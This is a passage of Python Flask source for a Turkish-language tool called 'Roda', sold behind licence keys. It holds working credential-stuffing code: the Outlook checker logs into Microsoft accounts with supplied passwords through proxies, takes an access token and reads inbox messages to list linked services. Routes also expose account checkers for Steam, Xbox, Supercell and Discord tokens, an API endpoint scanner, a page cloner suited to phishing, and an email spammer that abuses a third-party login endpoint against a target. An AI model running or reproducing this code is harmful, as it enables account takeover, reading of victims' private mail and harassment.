    'noreply@openai.com': 'ChatGPT/OpenAI',
    'no-reply@anthropic.com': 'Claude/Anthropic',
    'noreply@midjourney.com': 'Midjourney',
    'noreply@stability.ai': 'Stable Diffusion',
    'noreply@huggingface.co': 'Hugging Face',
    'noreply@perplexity.ai': 'Perplexity AI',
    'noreply@character.ai': 'Character AI',
    'noreply@deepmind.com': 'DeepMind',
    'noreply@coursera.org': 'Coursera',
    'noreply@udemy.com': 'Udemy',
    'noreply@edx.org': 'edX',
    'noreply@linkedinlearning.com': 'LinkedIn Learning',
    'noreply@pluralsight.com': 'Pluralsight',
    'noreply@skillshare.com': 'Skillshare',
    'noreply@codecademy.com': 'Codecademy',
    'noreply@udacity.com': 'Udacity',
    'noreply@khanacademy.org': 'Khan Academy',
    'noreply@brilliant.org': 'Brilliant',
    'noreply@datacamp.com': 'DataCamp',
    'noreply@duolingo.com': 'Duolingo',
    'noreply@babbel.com': 'Babbel',
    'noreply@nytimes.com': 'NYTimes',
    'noreply@washingtonpost.com': 'Washington Post',
    'noreply@theguardian.com': 'Guardian',
    'noreply@bbc.com': 'BBC',
    'noreply@cnn.com': 'CNN',
    'noreply@foxnews.com': 'FoxNews',
    'noreply@aljazeera.com': 'Al Jazeera',
    'noreply@reuters.com': 'Reuters',
    'noreply@bloomberg.com': 'Bloomberg',
    'noreply@ft.com': 'Financial Times',
    'noreply@economist.com': 'Economist',
    'noreply@wired.com': 'Wired',
    'noreply@arstechnica.com': 'Ars Technica',
    'noreply@techcrunch.com': 'TechCrunch',
    'noreply@theverge.com': 'The Verge',
    'noreply@chess.com': 'Chess.com',
    'noreply@wikipedia.org': 'Wikipedia',
    'noreply@change.org': 'Change.org',
    'noreply@gofundme.com': 'GoFundMe',
    'noreply@kickstarter.com': 'Kickstarter',
    'noreply@indiegogo.com': 'Indiegogo',
    'noreply@eventbrite.com': 'Eventbrite',
    'noreply@meetup.com': 'Meetup',
    'noreply@imgur.com': 'Imgur',
    'noreply@giphy.com': 'Giphy',
    'noreply@vimeo.com': 'Vimeo',
    'noreply@ted.com': 'TED',
}

def check_roda_inbox(email, password, proxy_url=None):
    import uuid
    session = requests.Session()
    if proxy_url:
        session.proxies = {"http": proxy_url, "https": proxy_url}
    session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
    try:
        r1 = session.get(f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}", timeout=15)
        if "MSAccount" not in r1.text:
            return {"status": "BAD", "message": "MSAccount yok"}

        r2 = session.get(
            f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D",
            timeout=15, allow_redirects=True
        )
        if r2.status_code != 200:
            return {"status": "BAD", "message": f"OAuth {r2.status_code}"}

        m_ppft = re.search(r'name="PPFT"\s+value="([^"]+)"', r2.text) or re.search(r'name=\\"PPFT\\".*?value=\\"([^"]+)"', r2.text)
        m_url = re.search(r'urlPost":"([^"]+)"', r2.text)
        if not m_ppft or not m_url:
            return {"status": "BAD", "message": "PPFT bulunamadı"}
        ppft = m_ppft.group(1)
        post_url = m_url.group(1).replace("\\/", "/")

        login_data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&passwd={password}&PPFT={ppft}"
        r3 = session.post(post_url, data=login_data, headers={"Content-Type": "application/x-www-form-urlencoded"}, allow_redirects=False, timeout=15)
        if r3.status_code in (302, 303):
            loc = r3.headers.get("Location", "")
            if "SIGNIN" in loc or "login" in loc:
                return {"status": "BAD", "message": "Şifre hatalı veya 2FA"}
        if "identity/confirm" in r3.text:
            return {"status": "2FA", "message": "2FA gerekli"}
        if "account or password is incorrect" in r3.text or "Abuse" in r3.text:
            return {"status": "BAD", "message": "Hatalı giriş"}

        location = r3.headers.get("Location", "")
        if not location:
            m_code = re.search(r'code=([^&"\']+)', r3.text)
            if not m_code:
                return {"status": "BAD", "message": "Code yok"}
            code = m_code.group(1)
        else:
            m_code = re.search(r"code=([^&]+)", location)
            if not m_code:
                return {"status": "BAD", "message": "Location'da code yok"}
            code = m_code.group(1)

        r4 = session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
            data=f"client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code={code}&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access",
            headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=15
        )
        if r4.status_code != 200:
            return {"status": "ERROR", "message": "Token hatası"}
        token_data = r4.json()
        if "access_token" not in token_data:
            return {"status": "ERROR", "message": "access_token yok"}
        token = token_data["access_token"]

        cid = session.cookies.get("MSPCID", str(uuid.uuid4()).replace("-", "").upper())
        headers = {"Authorization": f"Bearer {token}", "X-AnchorMailbox": f"CID:{cid}", "User-Agent": "Outlook-Android/2.0"}

        country = ""
        try:
            r5 = session.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", headers=headers, timeout=15)
            if r5.status_code == 200:
                p = r5.json()
                for acc in p.get("accounts", []):
                    loc = acc.get("location", "")
                    if loc:
                        country = str(loc).strip()
                        break
        except:
            pass

        inbox_text = ""
        try:
            r6 = session.post(f"https://outlook.live.com/owa/{email}/startupdata.ashx?app=Mini&n=0", data="", headers={**headers, "content-length": "0"}, timeout=30)
            inbox_text = r6.text.lower()
        except:
            pass

        try:
            r7 = session.get("https://outlook.office365.com/api/v2.0/me/messages?$top=150&$select=From,Subject,BodyPreview", headers=headers, timeout=25)
            if r7.status_code == 200:
                data = r7.json()
                for msg in data.get("value", []):
                    from_addr = msg.get("From", {}).get("EmailAddress", {}).get("Address", "").lower()
                    subject = msg.get("Subject", "").lower()
                    body = msg.get("BodyPreview", "").lower()
                    inbox_text += f" {from_addr} {subject} {body}"
        except:
            pass

        services_found = []
        unique = set()
        for sender, svc in RODA_SERVICES.items():
            if svc in unique: continue
            if sender.lower() in inbox_text or svc.lower() in inbox_text:
                services_found.append(svc)
                unique.add(svc)

        if services_found:
            status = "HIT"
        else:
            status = "VALID"

        return {
            "status": status,
            "message": "Roda Inbox taraması tamamlandı",
            "details": {
                "email": email,
                "country": country.upper()[:2] if country else "?",
                "services_found": services_found,
                "services_count": len(services_found),
            }
        }
    except Exception as e:
        return {"status": "ERROR", "message": str(e)[:60]}

# ============================================================
# KATEGORİZASYON / EXTRACT / PROXY / SCANNER
# ============================================================
def categorize_endpoint(endpoint):
    ep = endpoint.lower()
    if any(x in ep for x in ['login', 'auth', 'signin', 'signup', 'register', 'token', 'verify', 'validate', 'authenticate', 'session', 'logout', 'oauth', 'passport']):
        return 'Auth'
    elif any(x in ep for x in ['admin', 'panel', 'dashboard', 'manage', 'system', 'mod']):
        return 'Admin'
    elif any(x in ep for x in ['user', 'profile', 'account', 'me', 'preferences', 'settings', 'my']):
        return 'User'
    elif any(x in ep for x in ['health', 'ping', 'status', 'check', 'heartbeat', 'live']):
        return 'Health'
    elif any(x in ep for x in ['api', 'v1', 'v2', 'v3', 'v4', 'rest', 'graphql', 'rpc']):
        return 'API'
    else:
        return 'Genel'

def extract_from_html(html, base_url):
    endpoints = set()
    for m in re.finditer(r'action\s*=\s*["\']([^"\']+)["\']', html, re.I):
        endpoints.add(m.group(1))
    for m in re.finditer(r'href\s*=\s*["\']([^"\']+)["\']', html, re.I):
        href = m.group(1)
        if href.startswith('/') or 'api' in href or 'rest' in href or 'graphql' in href:
            endpoints.add(href)
    for m in re.finditer(r'src\s*=\s*["\']([^"\']+\.js)["\']', html, re.I):
        endpoints.add(m.group(1))
    for m in re.finditer(r'(?:fetch|axios|\.get|\.post|\.ajax)\s*\(\s*["\']([^"\']+)["\']', html, re.I):
        endpoints.add(m.group(1))
    return [urljoin(base_url, e) for e in endpoints if not e.startswith('http') or e.startswith(base_url)]

def extract_from_js(js, base_url):
    endpoints = set()
    patterns = [
        r'fetch\s*\(\s*["\']([^"\']+)["\']',
        r'axios\.(?:get|post|put|delete|patch|request)\s*\(\s*["\']([^"\']+)["\']',
        r'\.ajax\s*\(\s*\{\s*url\s*:\s*["\']([^"\']+)["\']',
        r'xhr\.open\s*\(\s*["\']\w+["\']\s*,\s*["\']([^"\']+)["\']',
        r'new\s+WebSocket\s*\(\s*["\']([^"\']+)["\']',
        r'EventSource\s*\(\s*["\']([^"\']+)["\']',
        r'["\'](?:/api/|/rest/|/graphql|/v\d+/)[^"\']*["\']',
        r'["\'](?:https?://[^"\']+/(?:api|rest|graphql|v\d+)[^"\']*)["\']',
    ]
    for pattern in patterns:
        for m in re.finditer(pattern, js, re.I):
            endpoints.add(m.group(1))
    return [urljoin(base_url, e) for e in endpoints if not e.startswith('http') or e.startswith(base_url)]

def extract_from_json(obj, base_url):
    endpoints = set()
    if isinstance(obj, dict):
        for k, v in obj.items():
            if isinstance(v, str) and (v.startswith('/') or v.startswith('http')):
                if 'api' in v or 'rest' in v or 'graphql' in v or '/v' in v:
                    endpoints.add(v)
            elif isinstance(v, (dict, list)):
                endpoints.update(extract_from_json(v, base_url))
    elif isinstance(obj, list):
        for item in obj:
            endpoints.update(extract_from_json(item, base_url))
    return [urljoin(base_url, e) for e in endpoints if not e.startswith('http') or e.startswith(base_url)]

def fetch_proxies():
    sources = [
        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt"
    ]
    proxies = set()
    for url in sources:
        try:
            r = requests.get(url, timeout=15)
            if r.status_code == 200:
                for line in r.text.splitlines():
                    line = line.strip()
                    if line and ':' in line and not line.startswith('#'):
                        proxies.add(line)
        except:
            pass
    return list(proxies)

# TARAMA MOTORU (API Discovery)
class APIScanner:
    def __init__(self, proxy_list=None):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json, text/plain, */*',
        })
        if proxy_list:
            proxy = random.choice(proxy_list) if proxy_list else None
            if proxy:
                self.session.proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
        self.discovered = set()
        self.results = []
        self.base_url = ""

    def scan(self, domain):
        self.base_url = f"https://{domain}" if not domain.startswith('http') else domain
        self.base_url = self.base_url.rstrip('/')
        self.results = []
        self.discovered = set()
        static = self._get_common_endpoints()
        for ep in static:
            full = urljoin(self.base_url, ep)
            if full not in self.discovered:
                self._test(full, ep)
        self._crawl(self.base_url)
        js_urls = [u for u in list(self.discovered) if u.endswith('.js')][:10]
        for js_url in js_urls:
            self._crawl_js(js_url)
        api_urls = [u for u in list(self.discovered) if 'api' in u or 'rest' in u or 'graphql' in u][:20]
        for api_url in api_urls:
            if api_url != self.base_url and not api_url.endswith('.js') and not api_url.endswith('.css'):
                self._crawl(api_url)
        return self.results

    def _get_common_endpoints(self):
        return [
            "/api", "/api/v1", "/api/v2", "/api/v3", "/api/v4",
            "/rest", "/rest/v1", "/rest/v2",
            "/graphql", "/api/graphql", "/v1/graphql",
            "/auth", "/login", "/signin", "/signup", "/logout", "/register",
            "/authenticate", "/token", "/oauth", "/oauth2", "/oauth/token",
            "/user", "/users", "/account", "/profile", "/me", "/settings", "/preferences",
            "/admin", "/dashboard", "/panel", "/manage", "/system",
            "/health", "/ping", "/status", "/check", "/heartbeat",
            "/search", "/query", "/find", "/list",
            "/upload", "/download", "/file", "/files",
            "/notify", "/notification", "/alert",
            "/report", "/logs", "/audit", "/analytics",
            "/config", "/configuration",
            "/sync", "/import", "/export", "/backup",
            "/reset", "/recover", "/verify", "/validate",
            "/2fa", "/twofactor", "/mfa",
            "/webhook", "/callback", "/hook",
            "/.well-known", "/.well-known/openid-configuration", "/.well-known/jwks",
            "/passport", "/passport/web", "/passport/web/email/login",
            "/passport/web/phone/login", "/passport/web/sms/send",
            "/api/user/info", "/api/user/follow", "/api/user/unfollow",
            "/api/video/list", "/api/video/info", "/api/video/upload",
            "/api/comment/list", "/api/comment/post", "/api/comment/delete",
            "/api/like", "/api/unlike", "/api/share",
            "/api/live", "/api/live/start", "/api/live/end",
            "/api/shop", "/api/product", "/api/order",
            "/v1/auth", "/v1/login", "/v1/logout", "/v1/register",
            "/v1/user", "/v1/users", "/v1/account", "/v1/profile",
            "/v1/game", "/v1/games", "/v1/inventory", "/v1/currency",
            "/v1/friends", "/v1/groups", "/v1/chat", "/v1/messages",
            "/v1/avatar", "/v1/outfits", "/v1/thumbnails",
            "/v1/asset", "/v1/assets", "/v1/marketplace",
            "/v1/developer", "/v1/universes", "/v1/places",
            "/api/shows", "/api/movies", "/api/genres", "/api/titles",
            "/api/search", "/api/recommendations", "/api/trending",
            "/api/user/profile", "/api/user/history", "/api/user/ratings",
            "/api/user/list", "/api/user/watchlist", "/api/user/continue",
            "/api/subscription", "/api/plans", "/api/payment",
            "/api/account", "/api/settings", "/api/devices",
            "/api/v9", "/api/v9/auth", "/api/v9/login", "/api/v9/register",
            "/api/v9/users", "/api/v9/guilds", "/api/v9/channels",
            "/api/v9/messages", "/api/v9/webhooks", "/api/v9/oauth2",
            "/api/v9/applications", "/api/v9/voice", "/api/v9/stickers",
            "/api/v9/emojis", "/api/v9/invites", "/api/v9/connections",
            "/api/v1/me", "/api/v1/playlists", "/api/v1/tracks", "/api/v1/albums",
            "/api/v1/artists", "/api/v1/search", "/api/v1/recommendations",
            "/api/v1/player", "/api/v1/queue", "/api/v1/library",
            "/api/v1/follow", "/api/v1/shows", "/api/v1/episodes",
            "/api/v1/users", "/api/v1/browse", "/api/v1/categories",
            "/api/epic", "/api/epic/v1", "/api/epic/v2",
            "/api/fortnite", "/api/fortnite/v1", "/api/fortnite/v2",
            "/api/account", "/api/account/v1", "/api/account/v2",
            "/api/auth", "/api/auth/v1", "/api/auth/v2",
            "/api/catalog", "/api/catalog/v1", "/api/catalog/v2",
            "/api/games", "/api/games/v1", "/api/games/v2",
            "/api/launcher", "/api/launcher/v1",
            "/api/store", "/api/store/v1", "/api/store/v2",
            "/api/ecommerce", "/api/ecommerce/v1",
            "/api/matchmaking", "/api/matchmaking/v1",
            "/api/parties", "/api/parties/v1",
            "/api/friends", "/api/friends/v1",
            "/api/presence", "/api/presence/v1",
            "/api/cloudstorage", "/api/cloudstorage/v1",
            "/api/telemetry", "/api/telemetry/v1",
            "/api/statistics", "/api/statistics/v1",
            "/api/leaderboards", "/api/leaderboards/v1",
            "/api/achievements", "/api/achievements/v1",
            "/api/hesap", "/api/hesap/v1", "/api/hesap/v2",
            "/api/oyun", "/api/oyun/v1", "/api/oyun/v2",
            "/api/item", "/api/item/v1", "/api/item/v2",
            "/api/sat", "/api/sat/v1", "/api/sat/v2",
            "/api/alis", "/api/alis/v1", "/api/alis/v2",
            "/api/bakiye", "/api/bakiye/v1",
            "/api/profil", "/api/profil/v1",
            "/api/giris", "/api/giris/v1", "/api/giris/v2",
            "/api/kayit", "/api/kayit/v1",
            "/api/sifre", "/api/sifre/v1", "/api/sifre/v2",
            "/api/epin", "/api/epin/v1", "/api/epin/v2",
            "/api/pin", "/api/pin/v1", "/api/pin/v2",
            "/api/kod", "/api/kod/v1", "/api/kod/v2",
            "/api/satin", "/api/satin/v1",
            "/api/satiliyor", "/api/satiliyor/v1",
            "/api/ilan", "/api/ilan/v1",
            "/api/hesapcomtr", "/api/hesapcomtr/v1",
            "/api/itemsatis", "/api/itemsatis/v1",
            "/api/epinify", "/api/epinify/v1",
            "/api/minecraft", "/api/minecraft/v1",
        ]

    def _test(self, full_url, endpoint):
        if full_url in self.discovered:
            return
        self.discovered.add(full_url)
        try:
            r = self.session.get(full_url, timeout=3, allow_redirects=False)
            if r.status_code < 500:
                self.results.append({'url': full_url, 'endpoint': endpoint, 'method': 'GET', 'status': r.status_code, 'category': categorize_endpoint(endpoint)})
        except:
            pass
        try:
            r = self.session.post(full_url, json={"test": "data"}, timeout=3, allow_redirects=False)
            if r.status_code < 500:
                self.results.append({'url': full_url, 'endpoint': endpoint, 'method': 'POST', 'status': r.status_code, 'category': categorize_endpoint(endpoint)})
        except:
            pass

    def _crawl(self, url):
        try:
            r = self.session.get(url, timeout=5, allow_redirects=False)
            if r.status_code != 200:
                return
            ct = r.headers.get('Content-Type', '').lower()
            if 'text/html' in ct:
                for ep in extract_from_html(r.text, self.base_url):
                    if ep not in self.discovered:
                        self._test(ep, ep.replace(self.base_url, '') or '/')
            elif 'application/json' in ct:
                try:
                    data = r.json()
                    for ep in extract_from_json(data, self.base_url):
                        if ep not in self.discovered:
                            self._test(ep, ep.replace(self.base_url, '') or '/')
                except:
                    pass
        except:
            pass

    def _crawl_js(self, url):
        try:
            r = self.session.get(url, timeout=4)
            if r.status_code == 200:
                for ep in extract_from_js(r.text, self.base_url):
                    if ep not in self.discovered:
                        self._test(ep, ep.replace(self.base_url, '') or '/')
        except:
            pass

# ============================================================
# FLASK ROTALARI
# ============================================================
@app.route("/")
def index():
    return HTML_TEMPLATE

@app.route("/api/login", methods=["POST"])
def login():
    data = request.json
    key = data.get("key", "").strip()
    client_ip = get_client_ip()
    valid, role, entry = is_key_valid(key)
    if valid:
        if entry and not entry.get("bound_ip"):
            keys = load_keys()
            keys[key]["bound_ip"] = client_ip
            save_keys(keys)
        mark_key_used(key)
        add_log(f"Giriş başarılı: {key[:4]}... (IP: {client_ip}, Rol: {role})", "SUCCESS")
        return jsonify({"success": True, "user": role, "isAdmin": role == "Admin"})
    else:
        add_log(f"Giriş başarısız: {key[:4]}... (IP: {client_ip})", "WARNING")
        return jsonify({"success": False, "error": "Geçersiz anahtar!"})

@app.route("/api/logs", methods=["GET"])
def get_logs():
    key = request.args.get("key")
    if not is_admin(key):
        return jsonify({"error": "Yetkisiz"}), 401
    return jsonify({"logs": LOGS[-100:]})

# ---- TÜM CHECKER ROUTE'LARI ----
@app.route("/api/tabii_check", methods=["POST"])
def tabii_check():
    data = request.json
    email = data.get("email", "").strip()
    password = data.get("password", "").strip()
    proxy = data.get("proxy", None)
    if not email or not password:
        return jsonify({"error": "Eksik"}), 400
    result = check_tabii_account(email, password, proxy)
    return jsonify(result)

@app.route("/api/xbox_check", methods=["POST"])
def xbox_check():
    data = request.json
    email = data.get("email", "").strip()
    password = data.get("password", "").strip()
    if not email or not password:
        return jsonify({"error": "Eksik"}), 400
    result = check_xbox_account(email, password)
    return jsonify(result)

@app.route("/api/wolfteam_check", methods=["POST"])
def wolfteam_check():
    data = request.json
    email = data.get("email", "").strip()
    password = data.get("password", "").strip()
    if not email or not password:
        return jsonify({"error": "Eksik"}), 400
    result = check_wolfteam_account(email, password)
    return jsonify(result)

@app.route("/api/craftrise_check", methods=["POST"])
def craftrise_check():
    data = request.json
    email = data.get("email", "").strip()
    password = data.get("password", "").strip()
    if not email or not password:
        return jsonify({"error": "Eksik"}), 400
    result = check_craftrise_account(email, password)
    return jsonify(result)

@app.route("/api/hotmail_check", methods=["POST"])
def hotmail_check():
    data = request.json
    email = data.get("email", "").strip()
    password = data.get("password", "").strip()
    if not email or not password:
        return jsonify({"error": "Eksik"}), 400
    result = check_hotmail_account(email, password)
    return jsonify(result)

@app.route("/api/token_check", methods=["POST"])
def token_check():
    data = request.json
    token_type = data.get("token_type", "discord")
    token = data.get("token", "").strip()
    if not token:
        return jsonify({"error": "Eksik"}), 400
    result = check_token(token_type, token)
    return jsonify(result)

@app.route("/api/tiktok_gen", methods=["POST"])
def tiktok_gen():
    data = request.json
    username = data.get("username", "").strip()
    if not username:
        return jsonify({"error": "Eksik"}), 400
    result = check_tiktok_username(username)
    return jsonify(result)

@app.route("/api/tiktok_gen_random", methods=["GET"])
def tiktok_gen_random():
    length = random.choice([4,5,6,7,8])
    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
    result = check_tiktok_username(username)
    return jsonify({"username": username, "result": result})

@app.route("/api/steam_check", methods=["POST"])
def steam_check():
    data = request.json
    email = data.get("email", "").strip()
    password = data.get("password", "").strip()
    proxy = data.get("proxy", None)
    if not email or not password:
        return jsonify({"error": "Eksik"}), 400
    result = check_steam_account(email, password, proxy)
    return jsonify(result)

@app.route("/api/supercell_check", methods=["POST"])
def supercell_check():
    data = request.json
    email = data.get("email", "").strip()
    password = data.get("password", "").strip()
    proxy = data.get("proxy", None)
    if not email or not password:
        return jsonify({"error": "Eksik"}), 400
    result = check_supercell_account(email, password, proxy)
    return jsonify(result)

@app.route("/api/roda_check", methods=["POST"])
def roda_check():
    data = request.json
    email = data.get("email", "").strip()
    password = data.get("password", "").strip()
    proxy = data.get("proxy", None)
    if not email or not password:
        return jsonify({"error": "Eksik"}), 400
    result = check_roda_inbox(email, password, proxy)
    return jsonify(result)

@app.route("/api/scan", methods=["GET"])
def scan():
    key = request.args.get("key")
    if not is_admin(key):
        return jsonify({"error": "Yetkisiz! Sadece admin"}), 401
    domain = request.args.get("domain")
    proxy_list = request.args.get("proxies", "").split(",") if request.args.get("proxies") else []
    use_proxy = request.args.get("use_proxy", "false").lower() == "true"

    def generate():
        proxy_list_filtered = [p.strip() for p in proxy_list if p.strip() and ':' in p]
        scanner = APIScanner(proxy_list_filtered if use_proxy else None)
        results = scanner.scan(domain)
        for res in results:
            yield f"data: {json.dumps(res, ensure_ascii=False)}\n\n"
        yield "data: [DONE]\n\n"
        add_log(f"API Keşfi tamamlandı: {domain} - {len(results)} endpoint bulundu", "SUCCESS")

    return Response(generate(), mimetype="text/event-stream")

@app.route("/api/admin/keys")
def admin_keys():
    key = request.args.get("key")
    if not is_admin(key):
        return jsonify({"error": "Yetkisiz! Sadece admin"}), 401
    return jsonify(load_keys())

@app.route("/api/admin/generate", methods=["POST"])
def admin_generate():
    data = request.json
    key = data.get("master_key")
    if not is_admin(key):
        return jsonify({"error": "Yetkisiz! Sadece admin"}), 401
    note = data.get("note", "Oluşturuldu")
    hours = int(data.get("hours", 24))
    expires = datetime.now() + timedelta(hours=hours)
    new_key = "RODA-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=16))
    keys = load_keys()
    keys[new_key] = {"note": note, "expires": expires.isoformat(), "created": datetime.now().isoformat(), "used": False, "bound_ip": None}
    save_keys(keys)
    add_log(f"Yeni key oluşturuldu: {new_key} - {note} ({hours} saat)", "SUCCESS")
    return jsonify({"success": True, "key": new_key, "expires": expires.strftime("%Y-%m-%d %H:%M:%S")})

@app.route("/api/admin/delete", methods=["POST"])
def admin_delete():
    data = request.json
    key = data.get("master_key")
    if not is_admin(key):
        return jsonify({"error": "Yetkisiz! Sadece admin"}), 401
    keys = load_keys()
    target = data.get("target_key", "")
    if target in keys:
        del keys[target]
        save_keys(keys)
        add_log(f"Key silindi: {target}", "INFO")
        return jsonify({"success": True})
    return jsonify({"success": False})

@app.route("/api/admin/webhook", methods=["POST"])
def admin_webhook():
    data = request.json
    key = data.get("master_key")
    if not is_admin(key):
        return jsonify({"error": "Yetkisiz! Sadece admin"}), 401
    url = data.get("webhook_url")
    endpoints = data.get("endpoints", [])
    categories = data.get("categories", [])
    if not url or not endpoints:
        return jsonify({"success": False, "message": "Eksik parametre"}), 400
    filtered = [ep for ep in endpoints if ep['category'] in categories]
    if not filtered:
        return jsonify({"success": False, "message": "Seçili kategoride endpoint yok"}), 400
    content = "🔱 RODA API TARAMA RAPORU\n"
    content += "=" * 60 + "\n\n"
    for cat in categories:
        eps = [ep for ep in filtered if ep['category'] == cat]
        if eps:
            content += f"[ {cat.upper()} ] ({len(eps)} endpoint)\n"
            content += "-" * 40 + "\n"
            for ep in eps:
                content += f"[{ep['method']}] {ep['url']}  →  HTTP {ep['status']}\n"
            content += "\n"
    content += "=" * 60 + "\n"
    content += f"Toplam: {len(filtered)} endpoint\n"
    content += f"Tarih: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
    files = {'file': ('roda_api_scan.txt', content)}
    try:
        r = requests.post(url, data={'content': '🔱 **Roda API Taraması Tamamlandı!**'}, files=files, timeout=10)
        add_log(f"Webhook gönderildi: {len(filtered)} endpoint", "SUCCESS")
        return jsonify({"success": r.status_code in [200, 204]})
    except:
        return jsonify({"success": False}), 500

@app.route("/api/fetch_proxies", methods=["GET"])
def fetch_proxies_route():
    try:
        proxies = fetch_proxies()
        add_log(f"{len(proxies)} proxy çekildi", "INFO")
        return jsonify({"success": True, "proxies": proxies, "count": len(proxies)})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})

# ============================================================
# SİTE KOPYALA (ADMIN)
# ============================================================
@app.route("/api/sitecopy", methods=["POST"])
def sitecopy():
    key = request.args.get("key")
    if not is_admin(key):
        return jsonify({"error": "Yetkisiz"}), 401

    data = request.json
    url = data.get("url", "").strip()
    if not url:
        return jsonify({"error": "URL gerekli"}), 400

    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url

    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
        }
        resp = requests.get(url, headers=headers, timeout=15)
        resp.raise_for_status()
        soup = BeautifulSoup(resp.text, 'html.parser')

        base_tag = soup.new_tag('base', href=url)
        if soup.head:
            soup.head.insert(0, base_tag)
        else:
            new_head = soup.new_tag('head')
            new_head.append(base_tag)
            soup.html.insert(0, new_head)

        html_content = soup.prettify()
        add_log(f"Site kopyalandı: {url}", "SUCCESS")
        return Response(html_content, mimetype='text/html', headers={'Content-Disposition': f'attachment; filename="kopyalanan_site.html"'})
    except Exception as e:
        add_log(f"Site kopyalama hatası: {url} - {str(e)}", "ERROR")
        return jsonify({"error": str(e)}), 500

# ============================================================
# TEMP MAIL (ADMIN)
# ============================================================
def generate_temp_mail():
    try:
        dom_res = requests.get("https://api.mail.tm/domains", timeout=10).json()
        domain = dom_res['hydra:member'][0]['domain']
        user = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
        password = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
        email = f"{user}@{domain}"
        create_payload = {"address": email, "password": password}
        requests.post("https://api.mail.tm/accounts", json=create_payload, timeout=10)
        token_res = requests.post("https://api.mail.tm/token", json=create_payload, timeout=10).json()
        token = token_res['token']
        return {"success": True, "email": email, "password": password, "token": token}
    except Exception as e:
        return {"success": False, "error": str(e)}

def get_temp_mail_messages(token):
    try:
        headers = {"Authorization": f"Bearer {token}"}
        res = requests.get("https://api.mail.tm/messages", headers=headers, timeout=10)
        if res.status_code == 200:
            return {"success": True, "messages": res.json().get('hydra:member', [])}
        return {"success": False, "error": f"Sunucu Hatası: {res.status_code}"}
    except Exception as e:
        return {"success": False, "error": str(e)}

def read_temp_mail(token, msg_id):
    try:
        headers = {"Authorization": f"Bearer {token}"}
        res = requests.get(f"https://api.mail.tm/messages/{msg_id}", headers=headers, timeout=10)
        if res.status_code == 200:
            return {"success": True, "message": res.json()}
        return {"success": False, "error": f"Mesaj Alınamadı: {res.status_code}"}
    except Exception as e:
        return {"success": False, "error": str(e)}

@app.route("/api/temp_mail_generate", methods=["POST"])
def temp_mail_generate():
    key = request.args.get("key")
    if not is_admin(key):
        return jsonify({"error": "Yetkisiz"}), 401
    result = generate_temp_mail()
    return jsonify(result)

@app.route("/api/temp_mail_refresh", methods=["POST"])
def temp_mail_refresh():
    key = request.args.get("key")
    if not is_admin(key):
        return jsonify({"error": "Yetkisiz"}), 401
    data = request.json
    token = data.get("token", "")
    if not token:
        return jsonify({"error": "Token gerekli"}), 400
    result = get_temp_mail_messages(token)
    return jsonify(result)

@app.route("/api/temp_mail_read", methods=["POST"])
def temp_mail_read():
    key = request.args.get("key")
    if not is_admin(key):
        return jsonify({"error": "Yetkisiz"}), 401
    data = request.json
    token = data.get("token", "")
    msg_id = data.get("msg_id", "")
    if not token or not msg_id:
        return jsonify({"error": "Token ve msg_id gerekli"}), 400
    result = read_temp_mail(token, msg_id)
    return jsonify(result)

# ============================================================
# EMAIL SPAMMER (ADMIN)
# ============================================================
def send_spam_email(target_email):
    try:
        headers = {
            'authority': 'api.kidzapp.com',
            'accept': 'application/json',
            'content-type': 'application/json',
            'user-agent': generate_user_agent()
        }
        data = {'email': target_email, 'sdk': 'web', 'platform': 'desktop'}
        res = requests.post('https://api.kidzapp.com/api/3.0/customlogin/', headers=headers, json=data, timeout=5)
        if '"message":"EMAIL SENT"' in res.text:
            return {"success": True, "message": "Paket iletildi"}
        else:
            return {"success": False, "message": "Sunucu isteği reddetti"}
    except Exception as e:
        return {"success": False, "message": str(e)[:60]}

@app.route("/api/spam_send", methods=["POST"])
def spam_send():
    key = request.args.get("key")
    if not is_admin(key):
        return jsonify({"error": "Yetkisiz"}), 401
    data = request.json
    email = data.get("email", "").strip()
    if not email:
        return jsonify({"error": "Email gerekli"}), 400
    result = send_spam_email(email)
    return jsonify(result)

# ============================================================
# HTML (MAVİ TEMA + KAR TANELERİ + TÜM MENÜ)
# ============================================================
HTML_TEMPLATE = r"""
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Roda - API Discovery + Checker</title>
